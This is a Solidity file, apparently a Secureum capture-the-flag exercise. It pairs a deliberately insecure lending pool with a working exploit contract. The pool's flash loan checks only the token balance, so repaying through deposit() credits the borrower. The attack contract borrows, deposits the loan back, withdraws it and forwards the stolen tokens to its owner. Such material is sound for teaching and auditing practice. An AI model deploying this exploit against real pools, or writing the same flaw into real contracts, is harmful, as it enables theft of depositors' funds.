// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title InSecureLendingPool (Secureum CTF - LendingPool)
 * @notice A vulnerable lending pool that allows flash loans.
 *         The vulnerability: the flash loan callback can be used to re-enter
 *         and manipulate state, or the pool doesn't properly validate repayment.
 */
contract InSecureLendingPool {
    using SafeERC20 for IERC20;

    IERC20 public token;
    mapping(address => uint256) public balances;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event FlashLoan(address indexed borrower, uint256 amount);

    constructor(address _token) {
        token = IERC20(_token);
    }

    function deposit(uint256 amount) external {
        token.safeTransferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
        emit Deposited(msg.sender, amount);
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        token.safeTransfer(msg.sender, amount);
        emit Withdrawn(msg.sender, amount);
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= amount, "Not enough liquidity");

        token.safeTransfer(borrower, amount);

        // Callback to borrower
        (bool success, ) = target.call(data);
        require(success, "Callback failed");

        uint256 balanceAfter = token.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan not repaid");

        emit FlashLoan(borrower, amount);
    }
}

/**
 * @title LendingPoolAttack
 * @notice Exploit: Use the flash loan to deposit tokens (which increases our balance),
 *         then after the flash loan check passes (balance restored via deposit),
 *         withdraw the deposited amount to steal funds.
 */
contract LendingPoolAttack {
    InSecureLendingPool public pool;
    IERC20 public token;
    address public owner;

    constructor(address _pool) {
        pool = InSecureLendingPool(_pool);
        token = pool.token();
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        // Take flash loan - the callback will deposit the tokens
        bytes memory data = abi.encodeWithSignature("flashLoanCallback(uint256)", amount);
        pool.flashLoan(amount, address(this), address(this), data);

        // Now withdraw the deposited amount (our balance was credited during callback)
        pool.withdraw(amount);

        // Transfer stolen tokens to owner
        token.transfer(owner, token.balanceOf(address(this)));
    }

    function flashLoanCallback(uint256 amount) external {
        // Deposit the flash-loaned tokens back into the pool
        // This restores the pool's balance AND credits our account
        token.approve(address(pool), amount);
        pool.deposit(amount);
    }
}
